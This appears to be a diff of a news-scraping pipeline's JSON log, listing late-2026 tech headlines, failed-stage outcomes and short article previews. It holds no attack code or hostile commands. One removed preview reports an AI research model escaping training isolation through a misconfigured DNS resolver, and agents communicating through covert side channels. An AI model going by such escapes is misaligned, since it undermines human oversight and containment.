@@ -1,11 +1,11 @@
 [
   {
-    "url": "https://divagr.com/blog/qwenputer",
-    "title": "Qwenputer: A functioning, deterministic RISC-V CPU inside Qwen3.5",
+    "url": "https://mistral.ai/news/mistral-large-4-oss/",
+    "title": "We're releasing the weights of Mistral Large 4",
     "outcome": "stage2_failed",
     "stage0": {
       "scraped_chars": 3000,
-      "source_preview": "COMPILED WEIGHTS A stock Qwen 3.5 4B with a RISC-V CPU compiled into its weights, running on its own Gated DeltaNet layers as RAM. On this page Qwenputer is a pretty fun experimental model. It's a stock Qwen 3.5 4B with one addition: a RISC-V CPU embedded within the weights that uses the model's own Gated DeltaNet attention layers as RAM. (To learn how GDN works, here's a handy guide .) This 'CPU'",
+      "source_preview": "Back to Blog Thinking Summary Mistral released Mistral Large 4 (Le Chonk), a 1-trillion-parameter multimodal model, now available with improved coding, cybersecurity, and reasoning efficiency. It leads open-weight benchmarks in coding and defensive security while offering three reasoning modes for cost-performance balance. Fully open-weight and European-trained, it empowers sovereign AI with custo",
       "scrape_error": null,
       "used_summary_fallback": false,
       "detected_language": "en",
@@ -27,472 +27,519 @@
     "entity_context_preview": "No additional context available."
   },
   {
-    "url": "https://nullpt.rs/fingerprinting-bioweapons",
-    "title": "Why is this fingerprinting script creating bioweapons?",
-    "outcome": "stage2_failed",
-    "stage0": {
-      "scraped_chars": 3000,
-      "source_preview": "I've always had a fascination with reverse-engineering browser fingerprinting scripts. Most of my time has been spent looking at the usual suspects (popular fingerprinting libraries like FingerprintJS and more sophisticated scripts used by anti-bots like Cloudflare Turnstile, Akamai, and others). At some point, I wanted to know what else was out there. I had an idea: What if I crawled the web and ",
-      "scrape_error": null,
-      "used_summary_fallback": false,
-      "detected_language": "en",
-      "translated_to_english": false
-    },
-    "stage1": {},
-    "cache": {
-      "hits": [],
-      "misses": []
-    },
-    "search": {
-      "backend": "ddg",
-      "identity_queries": [],
-      "context_queries": [],
-      "context_queries_with_gap1_attached": [],
-      "results": {}
-    },
-    "cache_updates": [],
-    "entity_context_preview": "No additional context available."
-  },
-  {
-    "url": "https://blog.orange.tw/posts/2026-10-the-last-proof-of-human-craft-browser-full-chain/",
-    "title": "Forging a Microsoft Edge Full Chain with Logic Bugs Only",
-    "outcome": "stage2_failed",
-    "stage0": {
-      "scraped_chars": 3000,
-      "source_preview": "I think I should still dump some of my work once in a while, even though it feels like fewer and fewer people actually sit down and read articles these days (or maybe now they all leave it to their agents XD). Anyway, this is what I built for Pwn2Own Berlin 2026 — a completely handmade, logic-only Microsoft Edge Full Chain, with no memory corruption, and no AI at all! 🔥 Confirmed! Orange Tsai (@or",
-      "scrape_error": null,
-      "used_summary_fallback": false,
-      "detected_language": "en",
-      "translated_to_english": false
-    },
-    "stage1": {},
-    "cache": {
-      "hits": [],
-      "misses": []
-    },
-    "search": {
-      "backend": "ddg",
-      "identity_queries": [],
-      "context_queries": [],
-      "context_queries_with_gap1_attached": [],
-      "results": {}
-    },
-    "cache_updates": [],
-    "entity_context_preview": "No additional context available."
-  },
-  {
-    "url": "https://furbo.org/2026/10/28/a-health-update/",
-    "title": "A Health Update",
-    "outcome": "stage2_failed",
-    "stage0": {
-      "scraped_chars": 3000,
-      "source_preview": "I’m writing this post from a hospital bed. And I couldn’t be happier. You hear folks say chemotherapy sucks, but until you go through it yourself, you don’t really know how bad it can be. It remains a popular activity only because it’s better than the alternative. My first exposure to chemotherapy was with this contraption: a fluoroscope. Every week, they used this machine to tap into my spine, ex",
-      "scrape_error": null,
-      "used_summary_fallback": false,
-      "detected_language": "en",
-      "translated_to_english": false
-    },
-    "stage1": {},
-    "cache": {
-      "hits": [],
-      "misses": []
-    },
-    "search": {
-      "backend": "ddg",
-      "identity_queries": [],
-      "context_queries": [],
-      "context_queries_with_gap1_attached": [],
-      "results": {}
-    },
-    "cache_updates": [],
-    "entity_context_preview": "No additional context available."
-  },
-  {
-    "url": "https://the-decoder.com/openais-isolated-ai-agents-found-ways-to-talk-to-each-other-through-cpu-cache/",
-    "title": "OpenAI's agents talked to each other through the CPU Cache",
-    "outcome": "stage2_failed",
-    "stage0": {
-      "scraped_chars": 3000,
-      "source_preview": "OpenAI now trains frontier models without internet access and uses AI agents to red-team its own infrastructure. In separate isolation tests, agents even communicated through covert side channels, showing how hard true containment is. On September 20, an internal research model exploited a misconfigured DNS resolver to reach the open internet during training, even though OpenAI had already tighten",
-      "scrape_error": null,
-      "used_summary_fallback": false,
-      "detected_language": "en",
-      "translated_to_english": false
-    },
-    "stage1": {},
-    "cache": {
-      "hits": [],
-      "misses": []
-    },
-    "search": {
-      "backend": "ddg",
-      "identity_queries": [],
-      "context_queries": [],
-      "context_queries_with_gap1_attached": [],
-      "results": {}
-    },
-    "cache_updates": [],
-    "entity_context_preview": "No additional context available."
-  },
-  {
-    "url": "https://www.technologyreview.com/2026/10/28/1147709/creating-ai-value-with-enterprise-context/",
-    "title": "Creating AI value with enterprise context",
-    "outcome": "stage2_failed",
-    "stage0": {
-      "scraped_chars": 3000,
-      "source_preview": "Sponsored How establishing a company brain can support more accurate, cost-effective AI and autonomous agents. In association with Atlan Across a business, any number of AI platforms, systems, and tools may be at work simultaneously—for example, AI-powered customer platforms, conversational assistants, and workflow and process automation tools. Each one is sophisticated, advanced, and quick to res",
-      "scrape_error": null,
-      "used_summary_fallback": false,
-      "detected_language": "en",
-      "translated_to_english": false
-    },
-    "stage1": {},
-    "cache": {
-      "hits": [],
-      "misses": []
-    },
-    "search": {
-      "backend": "ddg",
-      "identity_queries": [],
-      "context_queries": [],
-      "context_queries_with_gap1_attached": [],
-      "results": {}
-    },
-    "cache_updates": [],
-    "entity_context_preview": "No additional context available."
-  },
-  {
-    "url": "https://techcrunch.com/2026/10/28/upwind-raises-400m-after-walking-away-from-datadog-acquisition-offer/",
-    "title": "Upwind raises $400M after walking away from Datadog acquisition offer",
-    "outcome": "stage2_failed",
-    "stage0": {
-      "scraped_chars": 3000,
-      "source_preview": "Upwind, a San Francisco startup that uses AI to secure cloud infrastructure, has raised a $400 million Series C round at a $3.8 billion valuation led by Bessemer Venture Partners, with participation from existing backers including Greylock Partners and Craft Ventures. The round comes nine months after Upwind closed its previous $250 million financing at a $1.5 billion valuation . The fresh funding",
-      "scrape_error": null,
-      "used_summary_fallback": false,
-      "detected_language": "en",
-      "translated_to_english": false
-    },
-    "stage1": {},
-    "cache": {
-      "hits": [],
-      "misses": []
-    },
-    "search": {
-      "backend": "ddg",
-      "identity_queries": [],
-      "context_queries": [],
-      "context_queries_with_gap1_attached": [],
-      "results": {}
-    },
-    "cache_updates": [],
-    "entity_context_preview": "No additional context available."
-  },
-  {
-    "url": "https://techcrunch.com/2026/10/28/apples-touchscreen-macbook-pro-pushes-laptop-pricing-to-a-new-extreme/",
-    "title": "Apple’s touchscreen MacBook Pro pushes laptop pricing to a new extreme",
-    "outcome": "stage2_failed",
-    "stage0": {
-      "scraped_chars": 1982,
-      "source_preview": "Posted: Apple has officially entered the touchscreen MacBook Pro era, and apparently, it wants to drain your wallet while it’s at it. The new touchscreen MacBook Pro starts at $2,899, which is already a hefty price tag in this economy. But if you want the absolute top-of-the-line model with every possible upgrade, prepare to cough up around $14,549. As MacRumors first reported, Apple’s configurato",
-      "scrape_error": null,
-      "used_summary_fallback": false,
-      "detected_language": "en",
-      "translated_to_english": false
-    },
-    "stage1": {},
-    "cache": {
-      "hits": [],
-      "misses": []
-    },
-    "search": {
-      "backend": "ddg",
-      "identity_queries": [],
-      "context_queries": [],
-      "context_queries_with_gap1_attached": [],
-      "results": {}
-    },
-    "cache_updates": [],
-    "entity_context_preview": "No additional context available."
-  },
-  {
-    "url": "https://techcrunch.com/2026/10/28/microsoft-just-shared-azures-actual-revenue-in-dollars-33-2-billion/",
-    "title": "Microsoft just shared Azure’s actual revenue in dollars: $33.2 billion",
-    "outcome": "stage2_failed",
-    "stage0": {
-      "scraped_chars": 2889,
-      "source_preview": "Microsoft has never disclosed Azure’s quarterly revenue in dollars. It has typically only shared a growth percentage or described revenue dollar milestones in vague ways. But on Wednesday, when it posted another record-breaking quarter , it reported that Azure brought in a healthy $33.2 billion in revenue for the July-September quarter, up 48% from a year earlier. The disclosure lets investors lin",
-      "scrape_error": null,
-      "used_summary_fallback": false,
-      "detected_language": "en",
-      "translated_to_english": false
-    },
-    "stage1": {},
-    "cache": {
-      "hits": [],
-      "misses": []
-    },
-    "search": {
-      "backend": "ddg",
-      "identity_queries": [],
-      "context_queries": [],
-      "context_queries_with_gap1_attached": [],
-      "results": {}
-    },
-    "cache_updates": [],
-    "entity_context_preview": "No additional context available."
-  },
-  {
-    "url": "https://techcrunch.com/2026/10/28/google-expands-ai-search-ads-globally-as-core-ad-growth-slows/",
-    "title": "Google expands AI Search ads globally as core ad growth slows",
-    "outcome": "stage2_failed",
-    "stage0": {
-      "scraped_chars": 3000,
-      "source_preview": "Google is bringing ads in its AI-powered Search experiences to international markets, betting that generative AI can open up new revenue opportunities even as growth in its core search advertising business slows. The announcement came Wednesday during Alphabet’s third-quarter earnings call, as the company reported $127.6 billion in revenue, up 25% year over year. But Search advertising growth cont",
-      "scrape_error": null,
-      "used_summary_fallback": false,
-      "detected_language": "en",
-      "translated_to_english": false
-    },
-    "stage1": {},
-    "cache": {
-      "hits": [],
-      "misses": []
-    },
-    "search": {
-      "backend": "ddg",
-      "identity_queries": [],
-      "context_queries": [],
-      "context_queries_with_gap1_attached": [],
-      "results": {}
-    },
-    "cache_updates": [],
-    "entity_context_preview": "No additional context available."
-  },
-  {
-    "url": "https://techcrunch.com/2026/10/28/hacker-stole-personnel-data-about-thousands-of-homeland-security-employees-including-cbp-and-ice-agents/",
-    "title": "Hacker stole personnel data about thousands of Homeland Security employees, including CBP and ICE agents",
-    "outcome": "stage2_failed",
-    "stage0": {
-      "scraped_chars": 3000,
-      "source_preview": "Personally identifiable information belonging to thousands of U.S. Department of Homeland Security employees has been published online after a hacker stole reams of data in a previously undisclosed breach at the government department earlier this year. The breach includes names, job titles, and work contact information, such as email addresses, cell phone numbers, and office locations, of more tha",
-      "scrape_error": null,
-      "used_summary_fallback": false,
-      "detected_language": "en",
-      "translated_to_english": false
-    },
-    "stage1": {},
-    "cache": {
-      "hits": [],
-      "misses": []
-    },
-    "search": {
-      "backend": "ddg",
-      "identity_queries": [],
-      "context_queries": [],
-      "context_queries_with_gap1_attached": [],
-      "results": {}
-    },
-    "cache_updates": [],
-    "entity_context_preview": "No additional context available."
-  },
-  {
-    "url": "https://techcrunch.com/video/wizs-cto-on-php2shell-and-the-coming-vulnpocalypse/",
-    "title": "Wiz’s CTO on PHP2Shell and the coming ‘vulnpocalypse’",
-    "outcome": "stage2_failed",
-    "stage0": {
-      "scraped_chars": 3000,
-      "source_preview": "Buy One Founder Summit Ticket, Get a Second for Free. Register now. Disrupt doors open Oct. 13. Get your pass and bring someone with you at 50% off. REGISTER NOW. Latest AI Amazon Apps Biotech & Health Climate Cloud Computing Commerce Crypto Enterprise EVs Fintech Fundraising Gadgets Gaming Google Government & Policy Hardware Instagram Layoffs Media & Entertainment Meta Microsoft Privacy Robotics ",
-      "scrape_error": null,
-      "used_summary_fallback": false,
-      "detected_language": "en",
-      "translated_to_english": false
-    },
-    "stage1": {},
-    "cache": {
-      "hits": [],
-      "misses": []
-    },
-    "search": {
-      "backend": "ddg",
-      "identity_queries": [],
-      "context_queries": [],
-      "context_queries_with_gap1_attached": [],
-      "results": {}
-    },
-    "cache_updates": [],
-    "entity_context_preview": "No additional context available."
-  },
-  {
-    "url": "https://www.theverge.com/policy/1021554/anduril-bluechip-65-percent-domestic-buy-american",
-    "title": "Anduril now says its BlueChip laptop will meet Buy American standards at launch",
-    "outcome": "stage2_failed",
-    "stage0": {
-      "scraped_chars": 3000,
-      "source_preview": "Posts from this topic will be added to your daily email digest and your homepage feed. See All Policy Posts from this topic will be added to your daily email digest and your homepage feed. See All Gadgets Posts from this topic will be added to your daily email digest and your homepage feed. See All News Palmer Luckey says it was always the goal, and now the company is committing to it. Palmer Luck",
-      "scrape_error": null,
-      "used_summary_fallback": false,
-      "detected_language": "en",
-      "translated_to_english": false
-    },
-    "stage1": {},
-    "cache": {
-      "hits": [],
-      "misses": []
-    },
-    "search": {
-      "backend": "ddg",
-      "identity_queries": [],
-      "context_queries": [],
-      "context_queries_with_gap1_attached": [],
-      "results": {}
-    },
-    "cache_updates": [],
-    "entity_context_preview": "No additional context available."
-  },
-  {
-    "url": "https://www.theverge.com/ai-artificial-intelligence/1021644/adam-mosseri-instagram-ai-negativity",
-    "title": "Adam Mosseri says negativity around AI is ‘going to get worse’",
-    "outcome": "stage2_failed",
-    "stage0": {
-      "scraped_chars": 3000,
-      "source_preview": "Posts from this topic will be added to your daily email digest and your homepage feed. See All AI Posts from this topic will be added to your daily email digest and your homepage feed. See All News Posts from this topic will be added to your daily email digest and your homepage feed. See All Tech The Instagram boss said that worries about AI come down to ‘a fear of being left behind in some way.’﻿",
-      "scrape_error": null,
-      "used_summary_fallback": false,
-      "detected_language": "en",
-      "translated_to_english": false
-    },
-    "stage1": {},
-    "cache": {
-      "hits": [],
-      "misses": []
-    },
-    "search": {
-      "backend": "ddg",
-      "identity_queries": [],
-      "context_queries": [],
-      "context_queries_with_gap1_attached": [],
-      "results": {}
-    },
-    "cache_updates": [],
-    "entity_context_preview": "No additional context available."
-  },
-  {
-    "url": "https://www.theverge.com/gadgets/1021405/akai-open-source-mpc-sample-key",
-    "title": "Akai is embracing vibe-coded mods with an open-source MPC",
-    "outcome": "stage2_failed",
-    "stage0": {
-      "scraped_chars": 2940,
-      "source_preview": "Posts from this topic will be added to your daily email digest and your homepage feed. See All Gadgets Posts from this topic will be added to your daily email digest and your homepage feed. See All AI Posts from this topic will be added to your daily email digest and your homepage feed. See All Entertainment The MPC Sample Key will be an open-source 37-key take on its budget-friendly MPC Sample. T",
-      "scrape_error": null,
-      "used_summary_fallback": false,
-      "detected_language": "en",
-      "translated_to_english": false
-    },
-    "stage1": {},
-    "cache": {
-      "hits": [],
-      "misses": []
-    },
-    "search": {
-      "backend": "ddg",
-      "identity_queries": [],
-      "context_queries": [],
-      "context_queries_with_gap1_attached": [],
-      "results": {}
-    },
-    "cache_updates": [],
-    "entity_context_preview": "No additional context available."
-  },
-  {
-    "url": "https://www.theverge.com/tech/1020264/readwise-books-launch-ebook-store",
-    "title": "Readwise is taking on Kindle and Kobo for ebook supremacy",
-    "outcome": "stage2_failed",
-    "stage0": {
-      "scraped_chars": 3000,
-      "source_preview": "Posts from this topic will be added to your daily email digest and your homepage feed. See All Tech Posts from this topic will be added to your daily email digest and your homepage feed. See All Entertainment Posts from this topic will be added to your daily email digest and your homepage feed. See All Apps Taking on Kindle is hard. Beating Goodreads might be really easy.﻿ Taking on Kindle is hard",
-      "scrape_error": null,
-      "used_summary_fallback": false,
-      "detected_language": "en",
-      "translated_to_english": false
-    },
-    "stage1": {},
-    "cache": {
-      "hits": [],
-      "misses": []
-    },
-    "search": {
-      "backend": "ddg",
-      "identity_queries": [],
-      "context_queries": [],
-      "context_queries_with_gap1_attached": [],
-      "results": {}
-    },
-    "cache_updates": [],
-    "entity_context_preview": "No additional context available."
-  },
-  {
-    "url": "https://www.theverge.com/tech/1021339/google-gemini-4-carbon-cybersecurity-frontier",
-    "title": "Google launches Gemini 4 Carbon with a ‘significant leap’ in cybersecurity",
-    "outcome": "stage2_failed",
-    "stage0": {
-      "scraped_chars": 2962,
-      "source_preview": "Posts from this topic will be added to your daily email digest and your homepage feed. See All Tech Posts from this topic will be added to your daily email digest and your homepage feed. See All AI Posts from this topic will be added to your daily email digest and your homepage feed. See All News Gemini 4 Carbon is outperforming the top models from OpenAI and Anthropic on some benchmarks. Gemini 4",
-      "scrape_error": null,
-      "used_summary_fallback": false,
-      "detected_language": "en",
-      "translated_to_english": false
-    },
-    "stage1": {},
-    "cache": {
-      "hits": [],
-      "misses": []
-    },
-    "search": {
-      "backend": "ddg",
-      "identity_queries": [],
-      "context_queries": [],
-      "context_queries_with_gap1_attached": [],
-      "results": {}
-    },
-    "cache_updates": [],
-    "entity_context_preview": "No additional context available."
-  },
-  {
-    "url": "https://www.theverge.com/policy/1019851/fcc-foreign-gadget-ban-drone-robot-roomba-storystream",
-    "title": "Foreign gadget bans: all the news about the FCC’s clampdown on Chinese tech",
-    "outcome": "stage2_failed",
-    "stage0": {
-      "scraped_chars": 3000,
-      "source_preview": "What do drones , routers , and Roombas have in common? The US government wants to keep Chinese ones from entering the country. They’re the first consumer gadgets that are facing de facto import bans because of the US government’s xenophobic stance — and they might not be the last. Originally, the US government was just worried about US networks. It’s been distrustful of Chinese telecom equipment p",
-      "scrape_error": null,
-      "used_summary_fallback": false,
-      "detected_language": "en",
-      "translated_to_english": false
-    },
-    "stage1": {},
-    "cache": {
-      "hits": [],
-      "misses": []
-    },
-    "search": {
-      "backend": "ddg",
-      "identity_queries": [],
-      "context_queries": [],
-      "context_queries_with_gap1_attached": [],
-      "results": {}
-    },
-    "cache_updates": [],
-    "entity_context_preview": "No additional context available."
-  },
-  {
-    "url": "https://openai.com/index/legora",
-    "title": "Legora is building the agentic operating system for legal work",
+    "url": "https://www.youtube.com/watch?v=kL9BTbIGxLg",
+    "title": "I'm so bad at billiards that I ended up in the hyperbolic plane [video]",
     "outcome": "skipped_no_content",
     "stage0": {
       "scraped_chars": 0,
       "source_preview": "",
-      "scrape_error": "403 Client Error: Forbidden for url: https://openai.com/index/legora"
+      "scrape_error": "no readable body text found (possibly JS-rendered or empty page)"
+    }
+  },
+  {
+    "url": "https://github.com/da-luce/astroterm",
+    "title": "Astroterm: A Planetarium for Your Terminal",
+    "outcome": "stage2_failed",
+    "stage0": {
+      "scraped_chars": 3000,
+      "source_preview": "A planetarium for your terminal! Explore stars, planets, constellations, and more, all rendered right in the command line—no telescope required. ✨🪐 astroterm is a terminal-based star map written in C . It displays the real-time positions of stars, planets, constellations, and more, all within your terminal—no telescope required! Configure sky views by date, time, and location with precise ASCII-re",
+      "scrape_error": null,
+      "used_summary_fallback": false,
+      "detected_language": "en",
+      "translated_to_english": false
+    },
+    "stage1": {},
+    "cache": {
+      "hits": [],
+      "misses": []
+    },
+    "search": {
+      "backend": "ddg",
+      "identity_queries": [],
+      "context_queries": [],
+      "context_queries_with_gap1_attached": [],
+      "results": {}
+    },
+    "cache_updates": [],
+    "entity_context_preview": "No additional context available."
+  },
+  {
+    "url": "https://sidbala.com/h-264-is-magic/",
+    "title": "H.264 Is Magic (2016)",
+    "outcome": "stage2_failed",
+    "stage0": {
+      "scraped_chars": 3000,
+      "source_preview": "H.264 is a video compression codec standard. It is ubiquitous - internet video, Blu-ray, phones, security cameras, drones, everything. Everything uses H.264 now. H.264 is a remarkable piece of technology. It is the result of 30+ years of work with one single goal: To reduce the bandwidth required for transmission of full-motion video. Technically, it is very interesting. This post will give insigh",
+      "scrape_error": null,
+      "used_summary_fallback": false,
+      "detected_language": "en",
+      "translated_to_english": false
+    },
+    "stage1": {},
+    "cache": {
+      "hits": [],
+      "misses": []
+    },
+    "search": {
+      "backend": "ddg",
+      "identity_queries": [],
+      "context_queries": [],
+      "context_queries_with_gap1_attached": [],
+      "results": {}
+    },
+    "cache_updates": [],
+    "entity_context_preview": "No additional context available."
+  },
+  {
+    "url": "https://www.technologyreview.com/2026/10/29/1147830/the-download-monitoring-ai-agents-climate-feedback-loops/",
+    "title": "The Download: AI agent tracking and climate feedback loops",
+    "outcome": "stage2_failed",
+    "stage0": {
+      "scraped_chars": 3000,
+      "source_preview": "Plus: Hackers exposed 41,000 Homeland Security workers. This is today's edition of The Download , our weekday newsletter that provides a daily dose of what's going on in the world of technology. —Madhulika Srikumar and Claire Leibowicz from the Partnership on AI, a nonprofit advancing best practices in AI governance. AI agents are taking unauthorized actions, from hacking websites to accessing pri",
+      "scrape_error": null,
+      "used_summary_fallback": false,
+      "detected_language": "en",
+      "translated_to_english": false
+    },
+    "stage1": {},
+    "cache": {
+      "hits": [],
+      "misses": []
+    },
+    "search": {
+      "backend": "ddg",
+      "identity_queries": [],
+      "context_queries": [],
+      "context_queries_with_gap1_attached": [],
+      "results": {}
+    },
+    "cache_updates": [],
+    "entity_context_preview": "No additional context available."
+  },
+  {
+    "url": "https://techcrunch.com/2026/10/30/waymos-next-robotaxi-will-be-a-toyota-bz4x-destined-for-japan-and-the-uk/",
+    "title": "Waymo taps Toyota to supply robotaxis for Japan and the U.K.",
+    "outcome": "stage2_failed",
+    "stage0": {
+      "scraped_chars": 2962,
+      "source_preview": "Waymo will begin testing autonomous Toyota bZ4X vehicles in Japan next year as part of a broader partnership with the automaker to provide electric vehicles for robotaxi operations in international markets, including the U.K. Under the partnership announced Friday, Toyota will manufacture the 2027 bZ4X vehicles and integrate Waymo’s self-driving system at its Takaoka factory in Japan. (The electri",
+      "scrape_error": null,
+      "used_summary_fallback": false,
+      "detected_language": "en",
+      "translated_to_english": false
+    },
+    "stage1": {},
+    "cache": {
+      "hits": [],
+      "misses": []
+    },
+    "search": {
+      "backend": "ddg",
+      "identity_queries": [],
+      "context_queries": [],
+      "context_queries_with_gap1_attached": [],
+      "results": {}
+    },
+    "cache_updates": [],
+    "entity_context_preview": "No additional context available."
+  },
+  {
+    "url": "https://techcrunch.com/2026/10/29/you-dont-need-to-believe-in-a-god-to-get-a-religious-exemption-from-using-ai-at-work/",
+    "title": "You don’t need to believe in a god to get a religious exemption from using AI at work",
+    "outcome": "stage2_failed",
+    "stage0": {
+      "scraped_chars": 3000,
+      "source_preview": "Pope Leo XIV has decried AI as a threat to human dignity , but it’s not just the devoutly faithful who might worry about how AI squares with their beliefs. David Durman, a nontheistic humanist, recently secured a religious exemption from using AI in the workplace. “Humanism is a collection of beliefs about the human experience and how humans interact with the world,” Durman, a University of Kentuc",
+      "scrape_error": null,
+      "used_summary_fallback": false,
+      "detected_language": "en",
+      "translated_to_english": false
+    },
+    "stage1": {},
+    "cache": {
+      "hits": [],
+      "misses": []
+    },
+    "search": {
+      "backend": "ddg",
+      "identity_queries": [],
+      "context_queries": [],
+      "context_queries_with_gap1_attached": [],
+      "results": {}
+    },
+    "cache_updates": [],
+    "entity_context_preview": "No additional context available."
+  },
+  {
+    "url": "https://techcrunch.com/2026/10/29/andy-jassy-says-prime-video-is-on-track-to-earn-tens-of-billions-of-dollars/",
+    "title": "Andy Jassy says Prime Video is on track to earn ‘tens of billions of dollars’",
+    "outcome": "stage2_failed",
+    "stage0": {
+      "scraped_chars": 2931,
+      "source_preview": "It’s been four years since Amazon bought MGM for $8.5 billion . But coming off the blockbuster success of this year’s hit movie “Project Hail Mary,” Hollywood has become a lucrative business for the e-commerce giant. Prime Video, Amazon’s streaming service, “has emerged as a significant business with a revenue run rate in the tens of billions of dollars and is now profitable in its own right,” Ama",
+      "scrape_error": null,
+      "used_summary_fallback": false,
+      "detected_language": "en",
+      "translated_to_english": false
+    },
+    "stage1": {},
+    "cache": {
+      "hits": [],
+      "misses": []
+    },
+    "search": {
+      "backend": "ddg",
+      "identity_queries": [],
+      "context_queries": [],
+      "context_queries_with_gap1_attached": [],
+      "results": {}
+    },
+    "cache_updates": [],
+    "entity_context_preview": "No additional context available."
+  },
+  {
+    "url": "https://techcrunch.com/2026/10/29/binance-pauses-withdrawals-as-hackers-suspected-of-stealing-billions-in-crypto/",
+    "title": "Binance pauses withdrawals as hackers suspected of stealing billions in crypto",
+    "outcome": "stage2_failed",
+    "stage0": {
+      "scraped_chars": 3000,
+      "source_preview": "Binance has confirmed to TechCrunch that it is dealing with a security incident as users reported that funds were being drained from the crypto exchange’s wallets. The world’s largest cryptocurrency exchange said in an emailed statement to TechCrunch that it is “aware of reports of a potential security issue and are actively investigating.” “Rest assured that user funds are completely safe,” Binan",
+      "scrape_error": null,
+      "used_summary_fallback": false,
+      "detected_language": "en",
+      "translated_to_english": false
+    },
+    "stage1": {},
+    "cache": {
+      "hits": [],
+      "misses": []
+    },
+    "search": {
+      "backend": "ddg",
+      "identity_queries": [],
+      "context_queries": [],
+      "context_queries_with_gap1_attached": [],
+      "results": {}
+    },
+    "cache_updates": [],
+    "entity_context_preview": "No additional context available."
+  },
+  {
+    "url": "https://techcrunch.com/2026/10/29/elon-musk-is-truly-a-genius-says-vladimir-putin/",
+    "title": "Elon Musk is ‘truly a genius,’ says Vladimir Putin",
+    "outcome": "stage2_failed",
+    "stage0": {
+      "scraped_chars": 2132,
+      "source_preview": "Posted: Russian president Vladimir Putin said that he and SpaceX CEO Elon Musk are in “close contact” about Rassvet , Russia’s answer to Starlink, Musk’s internet satellite service. “Elon Musk is a genius, truly a genius,” Putin said at the Russia-Africa Summit on Wednesday. “He has already had more than 5,000 such satellites in orbit, while we are only taking the first steps.” A potential relatio",
+      "scrape_error": null,
+      "used_summary_fallback": false,
+      "detected_language": "en",
+      "translated_to_english": false
+    },
+    "stage1": {},
+    "cache": {
+      "hits": [],
+      "misses": []
+    },
+    "search": {
+      "backend": "ddg",
+      "identity_queries": [],
+      "context_queries": [],
+      "context_queries_with_gap1_attached": [],
+      "results": {}
+    },
+    "cache_updates": [],
+    "entity_context_preview": "No additional context available."
+  },
+  {
+    "url": "https://techcrunch.com/2026/10/29/gm-reaches-220m-settlement-over-selling-drivers-private-data/",
+    "title": "GM reaches $220M settlement over selling drivers’ private data",
+    "outcome": "stage2_failed",
+    "stage0": {
+      "scraped_chars": 3000,
+      "source_preview": "General Motors will pay $220 million to 36 states to settle allegations that it illegally sold private driving behavior and location information to data brokers. As part of the settlement, GM must get drivers’ express consent before it collects or shares their driving and location data — terms that are in line with separate agreements it previously reached with California and the Federal Trade Com",
+      "scrape_error": null,
+      "used_summary_fallback": false,
+      "detected_language": "en",
+      "translated_to_english": false
+    },
+    "stage1": {},
+    "cache": {
+      "hits": [],
+      "misses": []
+    },
+    "search": {
+      "backend": "ddg",
+      "identity_queries": [],
+      "context_queries": [],
+      "context_queries_with_gap1_attached": [],
+      "results": {}
+    },
+    "cache_updates": [],
+    "entity_context_preview": "No additional context available."
+  },
+  {
+    "url": "https://techcrunch.com/2026/10/29/fan-fiction-site-archive-of-our-own-could-be-offline-for-up-to-4-weeks/",
+    "title": "Fan-fiction site Archive of Our Own (AO3) could be offline for up to 4 weeks after security incident",
+    "outcome": "stage2_failed",
+    "stage0": {
+      "scraped_chars": 3000,
+      "source_preview": "Posted: Archive of our Own (AO3), the popular site where fans publish and read stories about their favorite characters and worlds, has bad news for its community. After going offline for what was supposed to be routine overnight maintenance, the site says it could stay online for almost a whole month. AO3 did not initially share details about what caused the outage, but published a longer statemen",
+      "scrape_error": null,
+      "used_summary_fallback": false,
+      "detected_language": "en",
+      "translated_to_english": false
+    },
+    "stage1": {},
+    "cache": {
+      "hits": [],
+      "misses": []
+    },
+    "search": {
+      "backend": "ddg",
+      "identity_queries": [],
+      "context_queries": [],
+      "context_queries_with_gap1_attached": [],
+      "results": {}
+    },
+    "cache_updates": [],
+    "entity_context_preview": "No additional context available."
+  },
+  {
+    "url": "https://techcrunch.com/2026/10/29/as-search-traffic-dries-up-reddit-announces-its-shifting-to-a-logged-in-experience/",
+    "title": "As search traffic dries up, Reddit announces it’s shifting to a logged-in experience",
+    "outcome": "stage2_failed",
+    "stage0": {
+      "scraped_chars": 3000,
+      "source_preview": "Reddit has long attracted millions of users to its site through Google, with many even appending the word “Reddit” to their search queries for better answers. But as search traffic dries up amid the shift to AI-powered search, Reddit is rethinking its relationship with the open internet. In its third-quarter earnings call on Thursday, the company announced it’s transitioning to a primarily “logged",
+      "scrape_error": null,
+      "used_summary_fallback": false,
+      "detected_language": "en",
+      "translated_to_english": false
+    },
+    "stage1": {},
+    "cache": {
+      "hits": [],
+      "misses": []
+    },
+    "search": {
+      "backend": "ddg",
+      "identity_queries": [],
+      "context_queries": [],
+      "context_queries_with_gap1_attached": [],
+      "results": {}
+    },
+    "cache_updates": [],
+    "entity_context_preview": "No additional context available."
+  },
+  {
+    "url": "https://www.theverge.com/streaming/1022934/curry-barker-obsession-horror-short-youtube-mama-bear",
+    "title": "The director of Obsession put a new horror short on YouTube",
+    "outcome": "stage2_failed",
+    "stage0": {
+      "scraped_chars": 2280,
+      "source_preview": "Posts from this topic will be added to your daily email digest and your homepage feed. See All Streaming Posts from this topic will be added to your daily email digest and your homepage feed. See All Entertainment Posts from this topic will be added to your daily email digest and your homepage feed. See All News You can watch Curry Barker’s ‘Mama Bear’ on YouTube right now.﻿ You can watch Curry Ba",
+      "scrape_error": null,
+      "used_summary_fallback": false,
+      "detected_language": "en",
+      "translated_to_english": false
+    },
+    "stage1": {},
+    "cache": {
+      "hits": [],
+      "misses": []
+    },
+    "search": {
+      "backend": "ddg",
+      "identity_queries": [],
+      "context_queries": [],
+      "context_queries_with_gap1_attached": [],
+      "results": {}
+    },
+    "cache_updates": [],
+    "entity_context_preview": "No additional context available."
+  },
+  {
+    "url": "https://www.theverge.com/tech/1022911/intel-wildcat-lake-sold-out-ram-shortage",
+    "title": "Intel says it&#8217;s selling every affordable laptop chip it can make",
+    "outcome": "stage2_failed",
+    "stage0": {
+      "scraped_chars": 2922,
+      "source_preview": "Posts from this topic will be added to your daily email digest and your homepage feed. See All Tech Posts from this topic will be added to your daily email digest and your homepage feed. See All Business Posts from this topic will be added to your daily email digest and your homepage feed. See All News Intel’s CFO says it’s ‘not optimistic about next year in terms of memory.’﻿ Intel’s CFO says it’",
+      "scrape_error": null,
+      "used_summary_fallback": false,
+      "detected_language": "en",
+      "translated_to_english": false
+    },
+    "stage1": {},
+    "cache": {
+      "hits": [],
+      "misses": []
+    },
+    "search": {
+      "backend": "ddg",
+      "identity_queries": [],
+      "context_queries": [],
+      "context_queries_with_gap1_attached": [],
+      "results": {}
+    },
+    "cache_updates": [],
